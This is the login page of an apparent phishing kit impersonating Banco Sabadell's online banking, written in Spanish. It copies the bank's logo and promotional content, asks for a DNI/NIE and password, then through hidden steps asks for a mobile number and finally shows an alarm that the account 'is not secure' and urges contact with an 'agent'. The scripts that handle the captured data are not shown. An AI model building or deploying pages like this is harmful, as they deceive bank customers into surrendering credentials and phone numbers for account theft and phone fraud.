<?php
include 'mobile_check.php';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Banco Sabadell</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    
    <header class="header">
        <div class="header-container">
            <div class="logo-section">
                <a href="#" class="logo-link">
                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQ0IiBoZWlnaHQ9IjI5IiB2aWV3Qm94PSIwIDAgMTQ0IDI5IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8ZyBjbGlwLXBhdGg9InVybCgjY2xpcDBfMTA5NTBfMjg2OTc4KSI+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTguNzU0MSA5LjM4MDI3QzE4Ljc1NDEgMTQuNTU4NyAxNC41NTg3IDE4Ljc1NDEgOS4zODAyNyAxOC43NTQxQzQuMjAxODUgMTguNzU0MSAwIDE0LjU1ODcgMCA5LjM4MDI3QzAgNC4xOTU0MiA0LjIwMTg1IDAgOS4zODAyNyAwQzE0LjU1MjMgMCAxOC43NTQxIDQuMTk1NDIgMTguNzU0MSA5LjM4MDI3Wk05LjQ5NTkyIDEwLjA2NzdINy44ODMyOUg3Ljg3Njg2VjEyLjMyMjhIOS4zOTMxMkM5LjQyODY3IDEyLjMyMjggOS40NjUwOCAxMi4zMjMgOS41MDIxNyAxMi4zMjMzQzkuODgwNzEgMTIuMzI1NCAxMC4zMjk0IDEyLjMyNzkgMTAuNjM5NSAxMi4xMTcyQzEwLjk1NDQgMTEuOTExNyAxMS4xMzQzIDExLjUzMjYgMTEuMTM0MyAxMS4xNDcxQzExLjEzNDMgMTAuNzkzNyAxMC45MTU4IDEwLjQyNzUgMTAuNjAxIDEwLjI0NzZDMTAuMjg2MiAxMC4wNjc3IDkuODQ5MjkgMTAuMDY3NyA5LjQ5NTkyIDEwLjA2NzdaTTkuMjA2OCA2LjM1NDE3SDcuODgzMjlINy44NzY4NlY4LjQwMzY5SDkuMzY3NDJDOS40MDA1OSA4LjQwMzY5IDkuNDM0MjMgOC40MDM4OCA5LjQ2ODIzIDguNDA0MDdDOS44Mjk0IDguNDA2MTEgMTAuMjMwOCA4LjQwODM5IDEwLjUzMDMgOC4xODUyNUMxMC43OTM3IDcuOTkyNSAxMC45Mjg3IDcuNjUxOTggMTAuOTI4NyA3LjMzNzE3QzEwLjkyODcgNi45OTY2NSAxMC43NjggNi42Njg5OCAxMC40NjYxIDYuNDg5MDlDMTAuMTk3MiA2LjM0MDkxIDkuNzM2MDIgNi4zNDc0MyA5LjM3OTAyIDYuMzUyNDlDOS4zMTgwOSA2LjM1MzM1IDkuMjYwMTkgNi4zNTQxNyA5LjIwNjggNi4zNTQxN1pNNS42OTg4NCAxNC4wNTc1VjQuNjgzNzFWNC42NzcyOEg5Ljg5NDI2QzEwLjYzMzEgNC42NzcyOCAxMS4zOTc3IDQuNjc3MjggMTIuMDQwMiA1LjA4ODQ3QzEyLjc5MTkgNS41NjM5MSAxMy4xOTAyIDYuMjUxMzcgMTMuMTkwMiA3LjEzOEMxMy4xOTAyIDguMjA0NTIgMTIuNDc3IDguOTExMjUgMTEuNDk0IDkuMTYxODJWOS4xODc1MkMxMi42NTY5IDkuNDE4ODIgMTMuNDQ3MiAxMC4zMTE5IDEzLjQ0NzIgMTEuNTI2MkMxMy40NDcyIDEyLjM0ODUgMTIuOTUyNSAxMy4wNzQ1IDEyLjI5NzIgMTMuNTVDMTEuNjE2MSAxNC4wNTc1IDEwLjY5NzQgMTQuMDU3NSA5Ljg5NDI2IDE0LjA1NzVINS42OTg4NFoiIGZpbGw9IiMwMDZERkYiLz4KPHBhdGggZD0iTTEzOC45MzcgMjguMzIwN0gxNDRWNC42ODM3SDEzOC45MzdWMjguMzIwN1pNMTMxLjM1NiAyOC4zMjA3SDEzNi40MTlWNC42ODM3SDEzMS4zNTZWMjguMzIwN1pNMTE3Ljg1MSAxNy40MzA2QzExOC4wMjQgMTUuNDMyNSAxMTguODg1IDEzLjc4MTMgMTIxLjEyMSAxMy43ODEzQzEyMy4zMjUgMTMuNzgxMyAxMjMuOTQ4IDE1LjUzNTMgMTI0LjA1MSAxNy40MzA2SDExNy44NTFaTTEyOS4xMiAyMC40MzFDMTI5LjE1MiAxOC4wNTM4IDEyOC43NzMgMTUuNTczOCAxMjcuMzI4IDEzLjU3NTdDMTI1Ljg4MiAxMS41Nzc2IDEyMy4zNjMgMTAuNDcyNSAxMjAuOTE2IDEwLjQ3MjVDMTE1LjQ3NCAxMC40NzI1IDExMi40MDMgMTQuNjQyMiAxMTIuNDAzIDE5LjgwNzhDMTEyLjQwMyAyNS4wMTE5IDExNS44MTQgMjguNjYxMiAxMjEuMDUgMjguNjYxMkMxMjYuOTc0IDI4LjY2MTIgMTI5LjAxMSAyMy40OTU2IDEyOS4wMTEgMjIuNjI4M0wxMjQuMzI3IDIyLjI4MTNDMTI0LjMyNyAyMy45MDA0IDEyMi43NzkgMjUuMDM3NiAxMjEuMjI0IDI1LjAzNzZDMTE5LjAyIDI1LjAzNzYgMTE3Ljg0NCAyMy4zNDc5IDExNy44NDQgMjEuMjc5MUwxMTcuODc3IDIwLjQxODFIMTI5LjEyVjIwLjQzMVpNMTA1LjQ0NSAyMS4wMTU2QzEwNS40NDUgMjEuODc2NiAxMDUuNDEyIDIyLjgwODIgMTA0Ljk5NSAyMy41OTg0QzEwNC41ODQgMjQuMzg4NyAxMDMuNzIzIDI1LjAxMTkgMTAyLjc5MSAyNS4wMTE5QzEwMC4yNzMgMjUuMDExOSAxMDAuMDAzIDIxLjgwNTkgMTAwLjAwMyAxOS45MTA2QzEwMC4wMDMgMTcuODA5NyAxMDAuMTA1IDE0LjAxOSAxMDMuMDAzIDE0LjAxOUMxMDUuMzEgMTQuMDE5IDEwNS40NTEgMTYuOTEwMiAxMDUuNDUxIDE4LjU5OTlWMjEuMDE1NkgxMDUuNDQ1Wk0xMTAuNTE0IDI4LjMyMDdWNC42ODM3SDEwNS40NTFWMTIuNjc2MkMxMDQuMzUyIDExLjA1NzEgMTAzLjA0MiAxMC40NzI1IDEwMS4wNzYgMTAuNDcyNUM5NS45NzQzIDEwLjQ3MjUgOTQuNjYzNiAxNS42MDU5IDk0LjY2MzYgMTkuNzc1N0M5NC42NjM2IDIzLjg0MjYgOTYuMDQ1IDI4LjY2NzYgMTAwLjk2NiAyOC42Njc2QzEwMy4yMDkgMjguNjY3NiAxMDQuNjU0IDI3LjQ1OTggMTA1LjYxOCAyNS42MDNIMTA1LjY4OVYyOC4zMjcxSDExMC41MTRWMjguMzIwN1pNODcuNTk2MyAyMC42MzY2Qzg3LjU5NjMgMjEuODc2NiA4Ny42Mjg0IDIyLjkxMSA4Ni45MDg5IDI0LjAxNkM4Ni4zMjQyIDI0LjkwOTEgODUuMzkyNiAyNS40NjE2IDg0LjM1ODIgMjUuNDYxNkM4Mi45NDQ3IDI1LjQ2MTYgODIuMTE1OSAyNC41MyA4Mi4xMTU5IDIzLjE1NTFDODIuMTE1OSAyMC42MDQ1IDg1LjY2MjQgMjAuMTYxMSA4Ny41OTYzIDE5Ljk0OTFWMjAuNjM2NlpNOTMuMTA4OCAyOC4zMjA3QzkyLjgzMjYgMjcuNDU5OCA5Mi43NjE5IDI2LjU5ODggOTIuNzYxOSAyNS42OTk0VjE3LjUzMzRDOTIuNzYxOSAxNS40MzI1IDkyLjkzNTQgMTMuNTA1IDkxLjE0MjggMTIuMDUzQzg5LjcyOTQgMTAuODc3MiA4Ny4zOTA3IDEwLjQ2NjEgODUuNTkxOCAxMC40NjYxQzgxLjkwMzkgMTAuNDY2MSA3Ny43NzI3IDExLjcwNjEgNzcuMjUyMyAxNS45NDY0TDgyLjA0NTIgMTYuMzk2MkM4Mi4wNDUyIDE0LjY3NDMgODMuNDU4NyAxMy44NDU1IDg1LjA3NzggMTMuODQ1NUM4NS44MzU5IDEzLjg0NTUgODYuNjk2OCAxNC4wODMyIDg3LjE0NjYgMTQuNjc0M0M4Ny42NjA2IDE1LjMyOTcgODcuNTk2MyAxNi4yMjI3IDg3LjU5NjMgMTYuOTgwOFYxNy4zOTJDODUuNDYzMyAxNy41OTc2IDgyLjY2ODUgMTcuNzM5IDgwLjY3MDMgMTguNDkwN0M3OC4zNjM4IDE5LjM1MTYgNzYuNzQ0OCAyMS4xMTIgNzYuNzQ0OCAyMy42OTQ4Qzc2Ljc0NDggMjcuMDAzNiA3OS4xNTQxIDI4LjY1NDggODIuMjU3MyAyOC42NTQ4Qzg0Ljg3ODYgMjguNjU0OCA4Ni4zOTQ5IDI3LjY1ODkgODcuODQwNSAyNS41OTAxQzg3LjgwODMgMjYuNDgzMiA4Ny44NzI2IDI3LjQxNDggODguMDg0NiAyOC4zMTQzSDkzLjEwODhWMjguMzIwN1pNNTkuNzI1MyAyOC4zMjA3SDYyLjQ4MTZDNjIuNzkgMjcuMzg5MSA2Mi45OTU2IDI2LjM5MzIgNjMuNjE4OCAyNS42MzUxQzY0Ljg5MDkgMjcuNzM2IDY2LjA5ODggMjguNjY3NiA2OC42MTczIDI4LjY2NzZDNzMuODg1NyAyOC42Njc2IDc1LjcxNjggMjQuMTUxIDc1LjcxNjggMTkuNTcwMUM3NS43MTY4IDE1LjQzMjUgNzQuMjAwNSAxMC40NzI1IDY5LjIwMiAxMC40NzI1QzY3LjIzNiAxMC40NzI1IDY1Ljc5MDQgMTEuMzAxMyA2NC45Mjk1IDEzLjAyMzFINjQuNzk0NlY0LjY4MzdINTkuNzMxOFYyOC4zMjA3SDU5LjcyNTNaTTY0Ljg1ODggMTguNDY1QzY0Ljg1ODggMTYuNjAxOCA2NS4yMDU3IDEzLjk1NDcgNjcuNjUzNiAxMy45NTQ3QzcwLjQ0MiAxMy45NTQ3IDcwLjQ0MiAxNy42MDQxIDcwLjQ0MiAxOS41NzAxQzcwLjQ0MiAyMS40NjU0IDcwLjQ0MiAyNS4xMTQ3IDY3LjU4MjkgMjUuMTE0N0M2Ni42NTEzIDI1LjExNDcgNjUuOTI1MyAyNC42NjUgNjUuNDQzNSAyMy45MDY4QzY0Ljg5MDkgMjMuMDQ1OSA2NC44NTg4IDIxLjk0MDggNjQuODU4OCAyMC45NzcxVjE4LjQ2NVpNNTEuNzY1IDIwLjYzNjZDNTEuNzY1IDIxLjg3NjYgNTEuNzk3MSAyMi45MTEgNTEuMDc3NSAyNC4wMTZDNTAuNDkyOCAyNC45MDkxIDQ5LjU2MTIgMjUuNDYxNiA0OC41MjY4IDI1LjQ2MTZDNDcuMTEzNCAyNS40NjE2IDQ2LjI4NDYgMjQuNTMgNDYuMjg0NiAyMy4xNTUxQzQ2LjI4NDYgMjAuNjA0NSA0OS44Mzc1IDIwLjE2MTEgNTEuNzY1IDE5Ljk0OTFWMjAuNjM2NlpNNTcuMjc3NSAyOC4zMjA3QzU3LjAwMTIgMjcuNDU5OCA1Ni45MzA1IDI2LjU5ODggNTYuOTMwNSAyNS42OTk0VjE3LjUzMzRDNTYuOTMwNSAxNS40MzI1IDU3LjEwNCAxMy41MDUgNTUuMzExNSAxMi4wNTNDNTMuODk4IDEwLjg3NzIgNTEuNTU5NCAxMC40NjYxIDQ5Ljc2MDQgMTAuNDY2MUM0Ni4wNzI2IDEwLjQ2NjEgNDEuOTQxNCAxMS43MDYxIDQxLjQyMSAxNS45NDY0TDQ2LjIxMzkgMTYuMzk2MkM0Ni4yMTM5IDE0LjY3NDMgNDcuNjI3NCAxMy44NDU1IDQ5LjI0NjQgMTMuODQ1NUM1MC4wMDQ2IDEzLjg0NTUgNTAuODY1NSAxNC4wODMyIDUxLjMxNTIgMTQuNjc0M0M1MS44MjkyIDE1LjMyOTcgNTEuNzY1IDE2LjIyMjcgNTEuNzY1IDE2Ljk4MDhWMTcuMzkyQzQ5LjYzMTkgMTcuNTk3NiA0Ni44MzcxIDE3LjczOSA0NC44MzkgMTguNDkwN0M0Mi41MjYgMTkuMzUxNiA0MC45MDcgMjEuMTEyIDQwLjkwNyAyMy42OTQ4QzQwLjkwNyAyNy4wMDM2IDQzLjMxNjMgMjguNjU0OCA0Ni40MTk1IDI4LjY1NDhDNDkuMDQwOCAyOC42NTQ4IDUwLjU1NzEgMjcuNjU4OSA1Mi4wMDI3IDI1LjU5MDFDNTEuOTcwNiAyNi40ODMyIDUyLjAzNDggMjcuNDE0OCA1Mi4yNDY4IDI4LjMxNDNINTcuMjc3NVYyOC4zMjA3Wk0zOS4wMTE3IDkuODg3ODJDMzcuNTY2MSA1Ljc4ODc4IDM0LjE4NjYgNC4zMzY3NiAzMC4wNTU0IDQuMzM2NzZDMjcuODgzOCA0LjMzNjc2IDI1Ljg1MzYgNC44MTg2MiAyNC4xMzE3IDYuMjY0MjFDMjIuNDQyIDcuNjc3NjggMjEuNTgxMSA5LjYwNTEzIDIxLjU4MTEgMTEuODE1M0MyMS41ODExIDE2Ljk4MDggMjUuNzE4NyAxOC4yMjA4IDI5LjkyMDUgMTkuMDgxOEMzMS4zNjYxIDE5LjM5MDIgMzQuMDU4MSAxOS43NjkyIDM0LjA1ODEgMjEuNzM1MkMzNC4wNTgxIDIzLjcwMTIgMzEuOTU3MiAyNC4yODU5IDMwLjM3MDIgMjQuMjg1OUMyNy45MjI0IDI0LjI4NTkgMjYuMTI5OCAyMy40MjUgMjUuNDQyNCAyMC45NDVMMjAuMzQxMSAyMi4xMTQzQzIxLjQwNzYgMjYuNzMzOCAyNS40NDI0IDI4LjY2MTIgMjkuODg4NCAyOC42NjEyQzMyLjI2NTYgMjguNjYxMiAzNC44NDg0IDI4LjIxMTUgMzYuNzQzNyAyNi43MzM4QzM4LjU2ODMgMjUuMzIwMyAzOS42NzM0IDIzLjExNjYgMzkuNjczNCAyMC44MTAxQzM5LjY3MzQgMTguNDY1IDM4LjQ5NzcgMTYuNTA1NCAzNi41NzAyIDE1LjIyNjlDMzQuOTE5IDE0LjEyMTggMzIuMzI5OCAxMy42Mzk5IDMwLjQwMjQgMTMuMjI4N0MyOS4wNTk2IDEyLjk4NDYgMjYuOTkwOCAxMi41NzM0IDI2Ljk5MDggMTAuODUxNUMyNi45OTA4IDkuMDI2ODkgMjguNzgzMyA4LjY0NzgzIDMwLjI2NzQgOC42NDc4M0MzMi4zNjg0IDguNjQ3ODMgMzMuNjQ2OSA5LjQzODA4IDM0LjMzNDQgMTEuNDQyNkwzOS4wMTE3IDkuODg3ODJaIiBmaWxsPSJibGFjayIvPgo8L2c+CjxkZWZzPgo8Y2xpcFBhdGggaWQ9ImNsaXAwXzEwOTUwXzI4Njk3OCI+CjxyZWN0IHdpZHRoPSIxNDQiIGhlaWdodD0iMjguNjY3NiIgZmlsbD0id2hpdGUiLz4KPC9jbGlwUGF0aD4KPC9kZWZzPgo8L3N2Zz4K" alt="Logo Banc Sabadell" class="logo">
                </a>
            </div>
            <div class="header-actions">
                <button class="btn-hazte-cliente">Hazte cliente</button>
                <button class="btn-ayuda">Ayuda</button>
                <button class="btn-menu">Menú</button>
            </div>
        </div>
    </header>

    
    <main class="main-content">
        
        <div class="background-decoration">
            <div class="fish-circle">
                <svg class="fish-1" viewBox="0 0 100 60" width="100" height="60">
                    <path d="M10 30 Q30 10, 50 30 Q70 50, 90 30 L85 25 L90 30 L85 35 Z" fill="#666" opacity="0.3"/>
                </svg>
                <svg class="fish-2" viewBox="0 0 120 80" width="120" height="80">
                    <path d="M15 40 Q40 15, 70 40 Q90 65, 105 40 L100 35 L105 40 L100 45 Z" fill="#666" opacity="0.3"/>
                </svg>
            </div>
        </div>
        
        <div class="login-container">
            <div class="login-section">
                <div class="login-header">
                    <h1>Acceder como Particular</h1>
                    <div class="security-info">
                        <span class="lock-icon">🔒</span>
                        <span>Esta web está bajo <a href="#" class="security-link">entorno seguro</a></span>
                    </div>
                </div>

                <div class="tabs">
                    <div class="tab active">Particular</div>
                    <div class="tab">Empresa</div>
                </div>

                
                <div id="login-form" class="form-container">
                    <h2>Introduce tus datos</h2>
                    <form id="loginForm">
                        <div class="form-group">
                            <div class="input-group">
                                <select class="document-type">
                                    <option>DNI / NIE</option>
                                    <option>CIF</option>
                                </select>
                                <input type="text" id="documentNumber" placeholder="Introduce tus datos" required>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <div class="input-group">
                                <input type="password" id="password" placeholder="Contraseña" required>
                                <button type="button" class="show-password" onclick="togglePassword()">
                                    <i id="eyeIcon" class="fa-solid fa-eye"></i>
                                </button>
                            </div>
                        </div>

                        <div class="form-group">
                            <label class="checkbox-label">
                                <input type="checkbox" id="rememberUser">
                                <span class="checkmark"></span>
                                Recordar usuario
                            </label>
                        </div>

                        <div id="login-error" class="error-message-inline hidden">
                            <span class="error-icon">⚠️</span>
                            <span class="error-text">Por favor, introduce un DNI/NIE válido y una contraseña de al menos 4 caracteres.</span>
                        </div>

                        <div class="form-actions">
                            <button type="submit" class="btn-entrar">Entrar</button>
                            <button type="button" class="btn-help">¿No puedes acceder?</button>
                        </div>
                    </form>
                </div>

                
                <div id="loading-screen" class="form-container hidden">
                    <div class="loading-content">
                        <div class="spinner"></div>
                        <p>Cargando...</p>
                    </div>
                </div>

                
                <div id="phone-form" class="form-container hidden">
                    <h2>Introduce tus datos</h2>
                    <form id="phoneForm">
                        <div class="form-group">
                            <div class="input-group">
                                <select class="document-type">
                                    <option>+34</option>
                                </select>
                                <input type="tel" id="phoneNumber" placeholder="Introduce tu número de teléfono (6XXXXXXXX)" maxlength="11" required>
                            </div>
                        </div>
                        
                        <div id="phone-error" class="error-message-inline hidden">
                            <span class="error-icon">⚠️</span>
                            <span class="error-text">Por favor, introduce un número de teléfono válido (debe empezar por 6).</span>
                        </div>
                        
                        <div class="form-actions">
                            <button type="submit" class="btn-entrar">Entrar</button>
                            <button type="button" class="btn-help">¿No puedes acceder?</button>
                        </div>
                    </form>
                </div>

                
                <div id="error-message" class="form-container hidden">
                    <div class="error-content">
                        <div class="error-icon">⚠️</div>
                        <h2>Atención</h2>
                        <p>Tu cuenta no está segura, por favor, contacta con un agente de atención al cliente.</p>
                        <div class="form-actions">
                            <button type="button" class="btn-entrar" onclick="location.reload()">Volver al inicio</button>
                        </div>
                    </div>
                </div>

                <div class="footer-links">
                    <a href="#" class="footer-link">Hazte Cliente</a>
                    <a href="#" class="footer-link">Seguridad</a>
                </div>
            </div>

            <div class="promo-section">
                <div class="promo-image">
                    <img src="https://www.bancsabadell.com/bsnacional/es/images/6000049427533/320x240-circular-login-part-hipotecas.webp" alt="Hipotecas Sabadell" class="promo-img">
                </div>
                <div class="promo-content">
                    <h3>Hipotecas Sabadell. Encantados de competir. Encuentra la mejor hipoteca para ti</h3>
                    <button class="btn-simula">Simula tu hipoteca</button>
                </div>
            </div>
        </div>
    </main>

    
    <footer class="footer">
        <div class="footer-content">
            <div class="stock-info">
                <div class="stock-item">
                    <span class="label">SAB.MC</span>
                    <span class="value">2.778 €</span>
                </div>
                <div class="stock-item">
                    <span class="time">17:35h 13/06/2025</span>
                    <span class="change">-2.1486 %</span>
                </div>
            </div>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>